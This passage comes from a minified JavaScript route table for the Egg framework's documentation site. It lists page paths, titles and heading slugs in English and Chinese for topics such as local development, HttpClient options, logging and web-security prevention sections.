Configuration",heading:"environment-configuration"},{depth:3,value:"About Reload",heading:"about-reload"},{depth:3,value:"Port Assignment",heading:"port-assignment"},{depth:2,value:"Unit Test",heading:"unit-test"},{depth:3,value:"Adding Script",heading:"adding-script-1"},{depth:3,value:"Environment Configuration",heading:"environment-configuration-1"},{depth:3,value:"Run specific test file",heading:"run-specific-test-file"},{depth:3,value:"Reporter Setting",heading:"reporter-setting"},{depth:3,value:"Timeout Setting",heading:"timeout-setting"},{depth:3,value:"Pass Parameters via argv",heading:"pass-parameters-via-argv"},{depth:2,value:"Code Coverage",heading:"code-coverage"},{depth:3,value:"Environment Configuration",heading:"environment-configuration-2"},{depth:3,value:"Ignore Specific Files",heading:"ignore-specific-files"},{depth:2,value:"Debugging",heading:"debugging"},{depth:3,value:"Log Print",heading:"log-print"},{depth:3,value:"Use Logger Module",heading:"use-logger-module"},{depth:3,value:"Use Debug Module",heading:"use-debug-module"},{depth:3,value:"Debug with egg-bin",heading:"debug-with-egg-bin"},{depth:4,value:"Adding Script",heading:"adding-script-2"},{depth:4,value:"Environment Configuration",heading:"environment-configuration-3"},{depth:4,value:"Debug with DevTools",heading:"debug-with-devtools"},{depth:4,value:"Debug with WebStorm",heading:"debug-with-webstorm"},{depth:4,value:"Debug with VSCode",heading:"debug-with-vscode"},{depth:2,value:"More",heading:"more"}],nav:{path:"/core",title:"Core"}},title:"Local Development - Egg"},{path:"/zh-CN/core/development",component:n("4qM7").default,exact:!0,meta:{filePath:"site/docs/core/development.zh-CN.md",updatedTime:1687656833e3,title:"\u672c\u5730\u5f00\u53d1",order:1,slugs:[{depth:2,value:"\u542f\u52a8\u5e94\u7528",heading:"\u542f\u52a8\u5e94\u7528"},{depth:3,value:"\u6dfb\u52a0\u547d\u4ee4",heading:"\u6dfb\u52a0\u547d\u4ee4"},{depth:3,value:"\u73af\u5883\u914d\u7f6e",heading:"\u73af\u5883\u914d\u7f6e"},{depth:3,value:"\u5173\u4e8e Reload \u529f\u80fd",heading:"\u5173\u4e8e-reload-\u529f\u80fd"},{depth:3,value:"\u6307\u5b9a\u7aef\u53e3",heading:"\u6307\u5b9a\u7aef\u53e3"},{depth:2,value:"\u5355\u5143\u6d4b\u8bd5",heading:"\u5355\u5143\u6d4b\u8bd5"},{depth:3,value:"\u6dfb\u52a0\u547d\u4ee4",heading:"\u6dfb\u52a0\u547d\u4ee4-1"},{depth:3,value:"\u73af\u5883\u914d\u7f6e",heading:"\u73af\u5883\u914d\u7f6e-1"},{depth:3,value:"\u8fd0\u884c\u7279\u5b9a\u7528\u4f8b\u6587\u4ef6",heading:"\u8fd0\u884c\u7279\u5b9a\u7528\u4f8b\u6587\u4ef6"},{depth:3,value:"\u6307\u5b9a reporter",heading:"\u6307\u5b9a-reporter"},{depth:3,value:"\u6307\u5b9a\u7528\u4f8b\u8d85\u65f6\u65f6\u95f4",heading:"\u6307\u5b9a\u7528\u4f8b\u8d85\u65f6\u65f6\u95f4"},{depth:3,value:"\u901a\u8fc7 argv \u65b9\u5f0f\u4f20\u53c2",heading:"\u901a\u8fc7-argv-\u65b9\u5f0f\u4f20\u53c2"},{depth:2,value:"\u4ee3\u7801\u8986\u76d6\u7387",heading:"\u4ee3\u7801\u8986\u76d6\u7387"},{depth:3,value:"\u73af\u5883\u914d\u7f6e",heading:"\u73af\u5883\u914d\u7f6e-2"},{depth:3,value:"\u5ffd\u7565\u6307\u5b9a\u6587\u4ef6",heading:"\u5ffd\u7565\u6307\u5b9a\u6587\u4ef6"},{depth:2,value:"\u8c03\u8bd5",heading:"\u8c03\u8bd5"},{depth:3,value:"\u65e5\u5fd7\u8f93\u51fa",heading:"\u65e5\u5fd7\u8f93\u51fa"},{depth:3,value:"\u4f7f\u7528 logger \u6a21\u5757",heading:"\u4f7f\u7528-logger-\u6a21\u5757"},{depth:3,value:"\u4f7f\u7528 debug \u6a21\u5757",heading:"\u4f7f\u7528-debug-\u6a21\u5757"},{depth:3,value:"\u4f7f\u7528 egg-bin \u8c03\u8bd5",heading:"\u4f7f\u7528-egg-bin-\u8c03\u8bd5"},{depth:4,value:"\u6dfb\u52a0\u547d\u4ee4",heading:"\u6dfb\u52a0\u547d\u4ee4-2"},{depth:4,value:"\u73af\u5883\u914d\u7f6e",heading:"\u73af\u5883\u914d\u7f6e-3"},{depth:4,value:"\u4f7f\u7528 DevTools \u8fdb\u884c\u8c03\u8bd5",heading:"\u4f7f\u7528-devtools-\u8fdb\u884c\u8c03\u8bd5"},{depth:4,value:"\u4f7f\u7528 WebStorm \u8fdb\u884c\u8c03\u8bd5",heading:"\u4f7f\u7528-webstorm-\u8fdb\u884c\u8c03\u8bd5"},{depth:4,value:"\u4f7f\u7528 VSCode \u8fdb\u884c\u8c03\u8bd5",heading:"\u4f7f\u7528-vscode-\u8fdb\u884c\u8c03\u8bd5"},{depth:2,value:"\u66f4\u591a",heading:"\u66f4\u591a"}],locale:"zh-CN",nav:{path:"/zh-CN/core",title:"\u6838\u5fc3\u529f\u80fd"}},title:"\u672c\u5730\u5f00\u53d1 - Egg"},{path:"/core/error-handling",component:n("YT8d").default,exact:!0,meta:{filePath:"site/docs/core/error-handling.md",updatedTime:1687656833e3,title:"Exception Handling",order:9,slugs:[{depth:2,value:"Exception Capture",heading:"exception-capture"},{depth:2,value:"Egg Takes Charge of Exceptions",heading:"egg-takes-charge-of-exceptions"},{depth:3,value:"errorPageUrl",heading:"errorpageurl"},{depth:2,value:"Create Your Universal Exception Handler",heading:"create-your-universal-exception-handler"},{depth:2,value:"404",heading:"404"},{depth:3,value:"Customize 404 Response",heading:"customize-404-response"}],nav:{path:"/core",title:"Core"}},title:"Exception Handling - Egg"},{path:"/zh-CN/core/error-handling",component:n("J0pO").default,exact:!0,meta:{filePath:"site/docs/core/error-handling.zh-CN.md",updatedTime:1687656833e3,title:"\u5f02\u5e38\u5904\u7406",order:9,slugs:[{depth:2,value:"\u5f02\u5e38\u6355\u83b7",heading:"\u5f02\u5e38\u6355\u83b7"},{depth:2,value:"\u6846\u67b6\u5c42\u7edf\u4e00\u5f02\u5e38\u5904\u7406",heading:"\u6846\u67b6\u5c42\u7edf\u4e00\u5f02\u5e38\u5904\u7406"},{depth:3,value:"errorPageUrl",heading:"errorpageurl"},{depth:2,value:"\u81ea\u5b9a\u4e49\u7edf\u4e00\u5f02\u5e38\u5904\u7406",heading:"\u81ea\u5b9a\u4e49\u7edf\u4e00\u5f02\u5e38\u5904\u7406"},{depth:2,value:"404",heading:"404"},{depth:3,value:"\u81ea\u5b9a\u4e49 404 \u54cd\u5e94",heading:"\u81ea\u5b9a\u4e49-404-\u54cd\u5e94"}],locale:"zh-CN",nav:{path:"/zh-CN/core",title:"\u6838\u5fc3\u529f\u80fd"}},title:"\u5f02\u5e38\u5904\u7406 - Egg"},{path:"/core/httpclient",component:n("A9qm").default,exact:!0,meta:{filePath:"site/docs/core/httpclient.md",updatedTime:1687656833e3,title:"HttpClient",order:5,slugs:[{depth:2,value:"Using HttpClient by app",heading:"using-httpclient-by-app"},{depth:2,value:"Using HttpClient by ctx",heading:"using-httpclient-by-ctx"},{depth:2,value:"Basic HTTP Request",heading:"basic-http-request"},{depth:3,value:"GET",heading:"get"},{depth:3,value:"POST",heading:"post"},{depth:3,value:"PUT",heading:"put"},{depth:3,value:"DELETE",heading:"delete"},{depth:2,value:"Advanced HTTP Request",heading:"advanced-http-request"},{depth:3,value:"Form Submission",heading:"form-submission"},{depth:3,value:"Uploading Files by Multipart",heading:"uploading-files-by-multipart"},{depth:3,value:"Uploading Files in Stream Mode",heading:"uploading-files-in-stream-mode"},{depth:2,value:"Options Parameters in Detail",heading:"options-parameters-in-detail"},{depth:3,value:"Default HttpClient Global Configuration",heading:"default-httpclient-global-configuration"},{depth:3,value:"data: Object",heading:"data-object"},{depth:3,value:"dataAsQueryString: Boolean",heading:"dataasquerystring-boolean"},{depth:3,value:"content: String|Buffer",heading:"content-stringbuffer"},{depth:3,value:"files: Mixed",heading:"files-mixed"},{depth:3,value:"stream: ReadStream",heading:"stream-readstream"},{depth:3,value:"writeStream: WriteStream",heading:"writestream-writestream"},{depth:3,value:"consumeWriteStream: Boolean",heading:"consumewritestream-boolean"},{depth:3,value:"method: String",heading:"method-string"},{depth:3,value:"contentType: String",heading:"contenttype-string"},{depth:3,value:"dataType: String",heading:"datatype-string"},{depth:3,value:"fixJSONCtlChars: Boolean",heading:"fixjsonctlchars-boolean"},{depth:3,value:"headers: Object",heading:"headers-object"},{depth:3,value:"timeout: Number|Array",heading:"timeout-numberarray"},{depth:3,value:"agent: HttpAgent",heading:"agent-httpagent"},{depth:3,value:"httpsAgent: HttpsAgent",heading:"httpsagent-httpsagent"},{depth:3,value:"auth: String",heading:"auth-string"},{depth:3,value:"digestAuth: String",heading:"digestauth-string"},{depth:3,value:"followRedirect: Boolean",heading:"followredirect-boolean"},{depth:3,value:"maxRedirects: Number",heading:"maxredirects-number"},{depth:3,value:"formatRedirectUrl: Function(from, to)",heading:"formatredirecturl-functionfrom-to"},{depth:3,value:"beforeRequest: Function(options)",heading:"beforerequest-functionoptions"},{depth:3,value:"streaming: Boolean",heading:"streaming-boolean"},{depth:3,value:"gzip: Boolean",heading:"gzip-boolean"},{depth:3,value:"timing: Boolean",heading:"timing-boolean"},{depth:3,value:"ca\uff0crejectUnauthorized\uff0cpfx\uff0ckey\uff0ccert\uff0cpassphrase\uff0cciphers\uff0csecureProtocol",heading:"carejectunauthorizedpfxkeycertpassphrasecipherssecureprotocol"},{depth:2,value:"Debugging Aid",heading:"debugging-aid"},{depth:2,value:"Known Issues",heading:"known-issues"},{depth:3,value:"Connection Timeout",heading:"connection-timeout"},{depth:3,value:"Service Response Timeout",heading:"service-response-timeout"},{depth:3,value:"Service Disconnect",heading:"service-disconnect"},{depth:3,value:"Service is Unreachable",heading:"service-is-unreachable"},{depth:3,value:"Domain Name is Not Existing",heading:"domain-name-is-not-existing"},{depth:3,value:"JSON Response Data Format Error",heading:"json-response-data-format-error"},{depth:2,value:"Global request and response Events",heading:"global-request-and-response-events"},{depth:3,value:"request Event Occurs before the Network Operation",heading:"request-event-occurs-before-the-network-operation"},{depth:3,value:"response Event Occurs after the End of Network Operation",heading:"response-event-occurs-after-the-end-of-network-operation"},{depth:2,value:"Example",heading:"example"}],nav:{path:"/core",title:"Core"}},title:"HttpClient - Egg"},{path:"/zh-CN/core/httpclient",component:n("oERm").default,exact:!0,meta:{filePath:"site/docs/core/httpclient.zh-CN.md",updatedTime:1687656833e3,title:"HttpClient",order:5,slugs:[{depth:2,value:"\u901a\u8fc7 app \u4f7f\u7528 HttpClient",heading:"\u901a\u8fc7-app-\u4f7f\u7528-httpclient"},{depth:2,value:"\u901a\u8fc7 ctx \u4f7f\u7528 HttpClient",heading:"\u901a\u8fc7-ctx-\u4f7f\u7528-httpclient"},{depth:2,value:"\u57fa\u672c HTTP \u8bf7\u6c42",heading:"\u57fa\u672c-http-\u8bf7\u6c42"},{depth:3,value:"GET",heading:"get"},{depth:3,value:"POST",heading:"post"},{depth:3,value:"PUT",heading:"put"},{depth:3,value:"DELETE",heading:"delete"},{depth:2,value:"\u9ad8\u7ea7 HTTP \u8bf7\u6c42",heading:"\u9ad8\u7ea7-http-\u8bf7\u6c42"},{depth:3,value:"Form \u8868\u5355\u63d0\u4ea4",heading:"form-\u8868\u5355\u63d0\u4ea4"},{depth:3,value:"\u4ee5 Multipart \u65b9\u5f0f\u4e0a\u4f20\u6587\u4ef6",heading:"\u4ee5-multipart-\u65b9\u5f0f\u4e0a\u4f20\u6587\u4ef6"},{depth:3,value:"\u4ee5 Stream \u65b9\u5f0f\u4e0a\u4f20\u6587\u4ef6",heading:"\u4ee5-stream-\u65b9\u5f0f\u4e0a\u4f20\u6587\u4ef6"},{depth:2,value:"options \u53c2\u6570\u8be6\u89e3",heading:"options-\u53c2\u6570\u8be6\u89e3"},{depth:3,value:"HttpClient \u9ed8\u8ba4\u5168\u5c40\u914d\u7f6e",heading:"httpclient-\u9ed8\u8ba4\u5168\u5c40\u914d\u7f6e"},{depth:3,value:"data: Object",heading:"data-object"},{depth:3,value:"dataAsQueryString: Boolean",heading:"dataasquerystring-boolean"},{depth:3,value:"content: String|Buffer",heading:"content-stringbuffer"},{depth:3,value:"files: Mixed",heading:"files-mixed"},{depth:3,value:"stream: ReadStream",heading:"stream-readstream"},{depth:3,value:"writeStream: WriteStream",heading:"writestream-writestream"},{depth:3,value:"consumeWriteStream: Boolean",heading:"consumewritestream-boolean"},{depth:3,value:"method: String",heading:"method-string"},{depth:3,value:"contentType: String",heading:"contenttype-string"},{depth:3,value:"dataType: String",heading:"datatype-string"},{depth:3,value:"fixJSONCtlChars: Boolean",heading:"fixjsonctlchars-boolean"},{depth:3,value:"headers: Object",heading:"headers-object"},{depth:3,value:"timeout: Number|Array",heading:"timeout-numberarray"},{depth:3,value:"agent: HttpAgent",heading:"agent-httpagent"},{depth:3,value:"httpsAgent: HttpsAgent",heading:"httpsagent-httpsagent"},{depth:3,value:"auth: String",heading:"auth-string"},{depth:3,value:"digestAuth: String",heading:"digestauth-string"},{depth:3,value:"followRedirect: Boolean",heading:"followredirect-boolean"},{depth:3,value:"maxRedirects: Number",heading:"maxredirects-number"},{depth:3,value:"formatRedirectUrl: Function(from, to)",heading:"formatredirecturl-functionfrom-to"},{depth:3,value:"beforeRequest: Function(options)",heading:"beforerequest-functionoptions"},{depth:3,value:"streaming: Boolean",heading:"streaming-boolean"},{depth:3,value:"gzip: Boolean",heading:"gzip-boolean"},{depth:3,value:"timing: Boolean",heading:"timing-boolean"},{depth:3,value:"ca\uff0crejectUnauthorized\uff0cpfx\uff0ckey\uff0ccert\uff0cpassphrase\uff0cciphers\uff0csecureProtocol",heading:"carejectunauthorizedpfxkeycertpassphrasecipherssecureprotocol"},{depth:2,value:"\u8c03\u8bd5\u8f85\u52a9",heading:"\u8c03\u8bd5\u8f85\u52a9"},{depth:2,value:"\u5e38\u89c1\u9519\u8bef",heading:"\u5e38\u89c1\u9519\u8bef"},{depth:3,value:"\u521b\u5efa\u8fde\u63a5\u8d85\u65f6",heading:"\u521b\u5efa\u8fde\u63a5\u8d85\u65f6"},{depth:3,value:"\u670d\u52a1\u54cd\u5e94\u8d85\u65f6",heading:"\u670d\u52a1\u54cd\u5e94\u8d85\u65f6"},{depth:3,value:"\u670d\u52a1\u4e3b\u52a8\u65ad\u5f00\u8fde\u63a5",heading:"\u670d\u52a1\u4e3b\u52a8\u65ad\u5f00\u8fde\u63a5"},{depth:3,value:"\u670d\u52a1\u4e0d\u53ef\u8fbe",heading:"\u670d\u52a1\u4e0d\u53ef\u8fbe"},{depth:3,value:"\u57df\u540d\u4e0d\u5b58\u5728",heading:"\u57df\u540d\u4e0d\u5b58\u5728"},{depth:3,value:"JSON \u54cd\u5e94\u6570\u636e\u683c\u5f0f\u9519\u8bef",heading:"json-\u54cd\u5e94\u6570\u636e\u683c\u5f0f\u9519\u8bef"},{depth:2,value:"\u5168\u5c40 request \u548c response \u4e8b\u4ef6",heading:"\u5168\u5c40-request-\u548c-response-\u4e8b\u4ef6"},{depth:3,value:"request \u4e8b\u4ef6\uff1a\u53d1\u751f\u5728\u7f51\u7edc\u64cd\u4f5c\u53d1\u751f\u4e4b\u524d",heading:"request-\u4e8b\u4ef6\u53d1\u751f\u5728\u7f51\u7edc\u64cd\u4f5c\u53d1\u751f\u4e4b\u524d"},{depth:3,value:"response \u4e8b\u4ef6\uff1a\u53d1\u751f\u5728\u7f51\u7edc\u64cd\u4f5c\u7ed3\u675f\u4e4b\u540e",heading:"response-\u4e8b\u4ef6\u53d1\u751f\u5728\u7f51\u7edc\u64cd\u4f5c\u7ed3\u675f\u4e4b\u540e"},{depth:2,value:"\u793a\u4f8b\u4ee3\u7801",heading:"\u793a\u4f8b\u4ee3\u7801"}],locale:"zh-CN",nav:{path:"/zh-CN/core",title:"\u6838\u5fc3\u529f\u80fd"}},title:"HttpClient - Egg"},{path:"/core/i18n",component:n("CpnO").default,exact:!0,meta:{filePath:"site/docs/core/i18n.md",updatedTime:1687656833e3,title:"I18n Internationalization",order:11,slugs:[{depth:2,value:"Default Language",heading:"default-language"},{depth:2,value:"Switch Language",heading:"switch-language"},{depth:2,value:"Writing I18n Multi-language Documents",heading:"writing-i18n-multi-language-documents"},{depth:2,value:"Getting Multi-language Texts",heading:"getting-multi-language-texts"},{depth:3,value:"Use in Controller",heading:"use-in-controller"},{depth:3,value:"Use in View",heading:"use-in-view"}],nav:{path:"/core",title:"Core"}},title:"I18n Internationalization - Egg"},{path:"/zh-CN/core/i18n",component:n("nPoA").default,exact:!0,meta:{filePath:"site/docs/core/i18n.zh-CN.md",updatedTime:1687656833e3,title:"\u56fd\u9645\u5316\uff08I18n\uff09",order:11,slugs:[{depth:2,value:"\u9ed8\u8ba4\u8bed\u8a00",heading:"\u9ed8\u8ba4\u8bed\u8a00"},{depth:2,value:"\u5207\u6362\u8bed\u8a00",heading:"\u5207\u6362\u8bed\u8a00"},{depth:2,value:"\u7f16\u5199 I18n \u591a\u8bed\u8a00\u6587\u4ef6",heading:"\u7f16\u5199-i18n-\u591a\u8bed\u8a00\u6587\u4ef6"},{depth:2,value:"\u83b7\u53d6\u591a\u8bed\u8a00\u6587\u672c",heading:"\u83b7\u53d6\u591a\u8bed\u8a00\u6587\u672c"},{depth:3,value:"Controller \u4e2d\u4f7f\u7528",heading:"controller-\u4e2d\u4f7f\u7528"},{depth:3,value:"View \u4e2d\u4f7f\u7528",heading:"view-\u4e2d\u4f7f\u7528"}],locale:"zh-CN",nav:{path:"/zh-CN/core",title:"\u6838\u5fc3\u529f\u80fd"}},title:"\u56fd\u9645\u5316\uff08I18n\uff09 - Egg"},{path:"/core",component:n("QkSN").default,exact:!0,meta:{filePath:"site/docs/core/index.md",updatedTime:1687656833e3,title:"Core",order:0,nav:{title:"Core",order:3,path:"/core"},slugs:[]},title:"Core - Egg"},{path:"/zh-CN/core",component:n("AJN3").default,exact:!0,meta:{filePath:"site/docs/core/index.zh-CN.md",updatedTime:1687656833e3,title:"\u6838\u5fc3\u529f\u80fd",order:0,nav:{title:"\u6838\u5fc3\u529f\u80fd",order:3,path:"/zh-CN/core"},slugs:[],locale:"zh-CN"},title:"\u6838\u5fc3\u529f\u80fd - Egg"},{path:"/core/logger",component:n("HoWz").default,exact:!0,meta:{filePath:"site/docs/core/logger.md",updatedTime:1687656833e3,title:"Logger",order:4,slugs:[{depth:2,value:"Location",heading:"location"},{depth:2,value:"Type of Logs",heading:"type-of-logs"},{depth:2,value:"Printing",heading:"printing"},{depth:3,value:"Context Logger",heading:"context-logger"},{depth:3,value:"App Logger",heading:"app-logger"},{depth:3,value:"Agent Logger",heading:"agent-logger"},{depth:2,value:"Encoding",heading:"encoding"},{depth:2,value:"Format",heading:"format"},{depth:2,value:"Log Level",heading:"log-level"},{depth:3,value:"Levels",heading:"levels"},{depth:4,value:"Debug Log in Production Environment",heading:"debug-log-in-production-environment"},{depth:3,value:"In Terminal",heading:"in-terminal"},{depth:2,value:"Create Your Logger",heading:"create-your-logger"},{depth:3,value:"Customized",heading:"customized"},{depth:3,value:"Custom logger formatter",heading:"custom-logger-formatter"},{depth:3,value:"Advanced",heading:"advanced"},{depth:2,value:"Log Sharding",heading:"log-sharding"},{depth:3,value:"Daily Sharding",heading:"daily-sharding"},{depth:3,value:"Size Sharding",heading:"size-sharding"},{depth:3,value:"Hourly Sharding",heading:"hourly-sharding"},{depth:2,value:"Performance",heading:"performance"}],nav:{path:"/core",title:"Core"}},title:"Logger - Egg"},{path:"/zh-CN/core/logger",component:n("NNgN").default,exact:!0,meta:{filePath:"site/docs/core/logger.zh-CN.md",updatedTime:1687656833e3,title:"\u65e5\u5fd7",order:4,slugs:[{depth:2,value:"\u65e5\u5fd7\u8def\u5f84",heading:"\u65e5\u5fd7\u8def\u5f84"},{depth:2,value:"\u65e5\u5fd7\u5206\u7c7b",heading:"\u65e5\u5fd7\u5206\u7c7b"},{depth:2,value:"\u5982\u4f55\u6253\u5370\u65e5\u5fd7",heading:"\u5982\u4f55\u6253\u5370\u65e5\u5fd7"},{depth:3,value:"Context Logger",heading:"context-logger"},{depth:3,value:"App Logger",heading:"app-logger"},{depth:3,value:"Agent Logger",heading:"agent-logger"},{depth:2,value:"\u65e5\u5fd7\u6587\u4ef6\u7f16\u7801",heading:"\u65e5\u5fd7\u6587\u4ef6\u7f16\u7801"},{depth:2,value:"\u65e5\u5fd7\u6587\u4ef6\u683c\u5f0f",heading:"\u65e5\u5fd7\u6587\u4ef6\u683c\u5f0f"},{depth:2,value:"\u65e5\u5fd7\u7ea7\u522b",heading:"\u65e5\u5fd7\u7ea7\u522b"},{depth:3,value:"\u6587\u4ef6\u65e5\u5fd7\u7ea7\u522b",heading:"\u6587\u4ef6\u65e5\u5fd7\u7ea7\u522b"},{depth:4,value:"\u751f\u4ea7\u73af\u5883\u6253\u5370 debug \u65e5\u5fd7",heading:"\u751f\u4ea7\u73af\u5883\u6253\u5370-debug-\u65e5\u5fd7"},{depth:3,value:"\u7ec8\u7aef\u65e5\u5fd7\u7ea7\u522b",heading:"\u7ec8\u7aef\u65e5\u5fd7\u7ea7\u522b"},{depth:2,value:"\u81ea\u5b9a\u4e49\u65e5\u5fd7",heading:"\u81ea\u5b9a\u4e49\u65e5\u5fd7"},{depth:3,value:"\u589e\u52a0\u81ea\u5b9a\u4e49\u65e5\u5fd7",heading:"\u589e\u52a0\u81ea\u5b9a\u4e49\u65e5\u5fd7"},{depth:3,value:"\u81ea\u5b9a\u4e49\u65e5\u5fd7\u683c\u5f0f",heading:"\u81ea\u5b9a\u4e49\u65e5\u5fd7\u683c\u5f0f"},{depth:3,value:"\u9ad8\u7ea7\u81ea\u5b9a\u4e49\u65e5\u5fd7",heading:"\u9ad8\u7ea7\u81ea\u5b9a\u4e49\u65e5\u5fd7"},{depth:2,value:"\u65e5\u5fd7\u5207\u5272",heading:"\u65e5\u5fd7\u5207\u5272"},{depth:3,value:"\u6309\u5929\u5207\u5272",heading:"\u6309\u5929\u5207\u5272"},{depth:3,value:"\u6309\u7167\u6587\u4ef6\u5927\u5c0f\u5207\u5272",heading:"\u6309\u7167\u6587\u4ef6\u5927\u5c0f\u5207\u5272"},{depth:3,value:"\u6309\u7167\u5c0f\u65f6\u5207\u5272",heading:"\u6309\u7167\u5c0f\u65f6\u5207\u5272"},{depth:2,value:"\u6027\u80fd",heading:"\u6027\u80fd"}],locale:"zh-CN",nav:{path:"/zh-CN/core",title:"\u6838\u5fc3\u529f\u80fd"}},title:"\u65e5\u5fd7 - Egg"},{path:"/core/security",component:n("EYzw").default,exact:!0,meta:{filePath:"site/docs/core/security.md",updatedTime:1687656833e3,title:"Security",order:10,slugs:[{depth:2,value:"Concept of Web Security",heading:"concept-of-web-security"},{depth:3,value:"Open or Close the Configuration",heading:"open-or-close-the-configuration"},{depth:3,value:"match and ignore",heading:"match-and-ignore"},{depth:2,value:"Prevention of Security Threat XSS",heading:"prevention-of-security-threat-xss"},{depth:3,value:"Reflected XSS",heading:"reflected-xss"},{depth:4,value:"Prevention",heading:"prevention"},{depth:3,value:"Stored XSS",heading:"stored-xss"},{depth:4,value:"Prevention",heading:"prevention-1"},{depth:3,value:"JSONP XSS",heading:"jsonp-xss"},{depth:3,value:"Other XSS Precautions",heading:"other-xss-precautions"},{depth:4,value:"CSP",heading:"csp"},{depth:4,value:"X-Download-Options:noopen",heading:"x-download-optionsnoopen"},{depth:4,value:"X-Content-Type-Options:nosniff",heading:"x-content-type-optionsnosniff"},{depth:4,value:"X-XSS-Protection",heading:"x-xss-protection"},{depth:2,value:"Prevention of Security Threat CSRF",heading:"prevention-of-security-threat-csrf"},{depth:3,value:"Prevention",heading:"prevention-2"},{depth:4,value:"Usage",heading:"usage"},{depth:5,value:"Submit Form with CSRF",heading:"submit-form-with-csrf"},{depth:5,value:"AJAX Request",heading:"ajax-request"},{depth:4,value:"Session vs Cookie Store",heading:"session-vs-cookie-store"},{depth:4,value:"Ignore JSON Request(deprecated)",heading:"ignore-json-requestdeprecated"},{depth:4,value:"Refresh CSRF token",heading:"refresh-csrf-token"},{depth:2,value:"Prevention of Security Threat XST",heading:"prevention-of-security-threat-xst"},{depth:3,value:"More",heading:"more"},{depth:3,value:"Prevention",heading:"prevention-3"},{depth:2,value:"Prevention of Security threats phishing attacks",heading:"prevention-of-security-threats-phishing-attacks"},{depth:3,value:"URL Phishing",heading:"url-phishing"},{depth:3,value:"Prevention",heading:"prevention-4"},{depth:3,value:"Photo Phishing",heading:"photo-phishing"},{depth:3,value:"Prevention",heading:"prevention-5"},{depth:3,value:"Iframe Phishing",heading:"iframe-phishing"},{depth:2,value:"Prevention of Security Threats HPP",heading:"prevention-of-security-threats-hpp"},{depth:3,value:"More",heading:"more-1"},{depth:3,value:"How to Protect",heading:"how-to-protect"},{depth:2,value:"man-in-middle attack with HTTP / HTTPS",heading:"man-in-middle-attack-with-http--https"},{depth:2,value:"SSRF Protection",heading:"ssrf-protection"},{depth:3,value:"How to Protect",heading:"how-to-protect-1"},{depth:4,value:"Configurations",heading:"configurations"},{depth:2,value:"Other Build-in Security Tools",heading:"other-build-in-security-tools"},{depth:3,value:"ctx.isSafeDomain(domain)",heading:"ctxissafedomaindomain"},{depth:3,value:"app.injectCsrf(str)",heading:"appinjectcsrfstr"},{depth:3,value:"app.injectNonce(str)",heading:"appinjectnoncestr"},{depth:3,value:"app.injectHijackingDefense(str)",heading:"appinjecthijackingdefensestr"}],nav:{path:"/core",title:"Core"}},title:"Security - Egg"},{path:"/zh-CN/core/security",component:n("nTVa").default,exact:!0,meta:{filePath:"site/docs/core/security.zh-CN.md",updatedTime:1687656833e3,title:"\u5b89\u5168",order:10,slugs:[{depth:2,value:"Web \u5b89\u5168\u6982\u5ff5",heading:"web-\u5b89\u5168\u6982\u5ff5"},{depth:3,value:"\u5f00\u542f\u4e0e\u5173\u95ed\u914d\u7f6e",heading:"\u5f00\u542f\u4e0e\u5173\u95ed\u914d\u7f6e"},{depth:3,value:"match \u548c ignore",heading:"match-\u548c-ignore"},{depth:2,value:"\u5b89\u5168\u5a01\u80c1XSS\u7684\u9632\u8303",heading:"\u5b89\u5168\u5a01\u80c1xss\u7684\u9632\u8303"},{depth:3,value:"Reflected XSS",heading:"reflected-xss"},{depth:4,value:"\u9632\u8303\u65b9\u5f0f",heading:"\u9632\u8303\u65b9\u5f0f"},{depth:3,value:"Stored XSS",heading:"stored-xss"},{depth:4,value:"\u9632\u8303\u65b9\u5f0f",heading:"\u9632\u8303\u65b9\u5f0f-1"},{depth:3,value:"JSONP XSS",heading:"jsonp-xss"},{depth:3,value:"\u5176\u4ed6 XSS \u7684\u9632\u8303\u65b9\u5f0f",heading:"\u5176\u4ed6-xss-\u7684\u9632\u8303\u65b9\u5f0f"},{depth:4,value:"CSP",heading:"csp"},{depth:4,value:"X-Download-Options:noopen",heading:"x-download-optionsnoopen"},{depth:4,value:"X-Content-Type-Options:nosniff",heading:"x-content-type-optionsnosniff"},{depth:4,value:"X-XSS-Protection",heading:"x-xss-protection"},{depth:2,value:"\u5b89\u5168\u5a01\u80c1 CSRF \u7684\u9632\u8303",heading:"\u5b89\u5168\u5a01\u80c1-csrf-\u7684\u9632\u8303"},{depth:3,value:"\u9632\u8303\u65b9\u5f0f",heading:"\u9632\u8303\u65b9\u5f0f-2"},{depth:4,value:"\u4f7f\u7528\u65b9\u5f0f",heading:"\u4f7f\u7528\u65b9\u5f0f"},{depth:5,value:"\u540c\u6b65\u8868\u5355\u7684 CSRF \u6821\u9a8c",heading:"\u540c\u6b65\u8868\u5355\u7684-csrf-\u6821\u9a8c"},{depth:5,value:"AJAX \u8bf7\u6c42",heading:"ajax-\u8bf7\u6c42"},{depth:4,value:"Session vs Cookie \u5b58\u50a8",heading:"session-vs-cookie-\u5b58\u50a8"},{depth:4,value:"\u5ffd\u7565 JSON \u8bf7\u6c42(\u5df2\u5e9f\u5f03)",heading:"\u5ffd\u7565-json-\u8bf7\u6c42\u5df2\u5e9f\u5f03"},{depth:4,value:"\u5237\u65b0 CSRF token",heading:"\u5237\u65b0-csrf-token"},{depth:2,value:"\u5b89\u5168\u5a01\u80c1 XST \u7684\u9632\u8303",heading:"\u5b89\u5168\u5a01\u80c1-xst-\u7684\u9632\u8303"},{depth:3,value:"\u62d3\u5c55\u9605\u8bfb",heading:"\u62d3\u5c55\u9605\u8bfb"},{depth:3,value:"\u9632\u8303\u65b9\u5f0f",heading:"\u9632\u8303\u65b9\u5f0f-3"},{depth:2,value:"\u5b89\u5168\u5a01\u80c1 \u9493\u9c7c\u653b\u51fb \u7684\u9632\u8303",heading:"\u5b89\u5168\u5a01\u80c1-\u9493\u9c7c\u653b\u51fb-\u7684\u9632\u8303"},{depth:3,value:"url \u9493\u9c7c",heading:"url-\u9493\u9c7c"},{depth:3,value:"\u9632\u8303\u65b9\u5f0f",heading:"\u9632\u8303\u65b9\u5f0f-4"},{depth:3,value:"\u56fe\u7247\u9493\u9c7c",heading:"\u56fe\u7247\u9493\u9c7c"},{depth:3,value:"\u9632\u8303\u65b9\u5f0f",heading:"\u9632\u8303\u65b9\u5f0f-5"},{depth:3,value:"iframe \u9493\u9c7c",heading:"iframe-\u9493\u9c7c"},{depth:2,value:"\u5b89\u5168\u5a01\u80c1 HPP 